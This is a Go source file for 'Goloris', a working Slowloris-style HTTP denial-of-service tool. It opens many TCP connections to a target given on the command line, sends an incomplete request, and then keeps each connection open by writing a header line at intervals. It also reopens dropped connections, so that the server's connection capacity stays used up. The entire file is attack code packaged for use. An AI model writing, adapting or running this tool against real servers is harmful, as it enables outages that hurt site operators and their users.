package main

import (
	"fmt"
	"net"
	"bytes"
	"io"
	"time"
	"os"
	"os/signal"
	"strings"
	"flag"
)

type connectionError struct {
	err error
	killIndex int // index of the the kill channel in kill channel list
}

func (c *connectionError) Error() string {
	return c.err.Error()
}

const (
	defaultUserAgent = "Goloris HTTP DoS"
)

// Command line options
var (
	numConnections int
	interval int
	method string
	resource string
	userAgent string
	target string
)

func main() {
	parseParams()
	if len(flag.Args()) == 0  {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		target += ":80"
	}

	donechan := make(chan int)
	killchans := openConnections(target, numConnections, donechan)

	signal.Notify(signals, os.Interrupt, os.Kill)

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, killing connections...")
			for _, killchan := range killchans {
				killchan <- true
			}
			fmt.Printf("done\n")
			break loop

		case index := <-donechan:
			fmt.Println("an error occured withing a connection, starting a new one")
			kill := make(chan bool)
			killchans[index] = kill
			go slowloris(target, interval, kill, index, donechan)
		}
	}
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.StringVar(&method, "method", "GET", "HTTP method to user")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed if not defined")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
}

// Open given number of connections to target and return a chan slice that
// is used to kill the goroutines
func openConnections(target string, num int, donechan chan int) []chan bool {
	killchans := make([]chan bool, 0)

	for i:=0; i<num; i++ {
		kill := make(chan bool)
		go slowloris(target, interval, kill, i, donechan)
		killchans = append(killchans, kill)
	}

	return killchans
}

func slowloris(target string, interval int, kill chan bool, killIndex int, donechan chan int) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		donechan <- killIndex
		return
	} 
	defer conn.Close()

	// Send first headers
	host := target 
	headers := makeHeaders(host)
	req := createRequest(host, method, resource, headers)
	_, err = io.Copy(conn, req)
	if err != nil {
		donechan <- killIndex
		return
	}

	// Send a header every interval seconds, until an error occurs or 
	// a signal is sent through the kill channel
	loop:
	for {
		select {
		case <-kill:
			break loop

		case <-time.After(time.Duration(interval) * time.Second):
			_, err := conn.Write([]byte("Cookie: a=b\r\n"))
			if err != nil {
				donechan <- killIndex
				return
			}
		}
	}

	return
}

func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
	buf := bytes.NewBuffer(make([]byte, 0))
	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, resource))

	for header, value := range headers {
		buf.WriteString(fmt.Sprintf("%s: %s\r\n", header, value))
	}

	return buf
}

func makeHeaders(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent 
	headers["Content-Length"] = "42"

	return headers
}
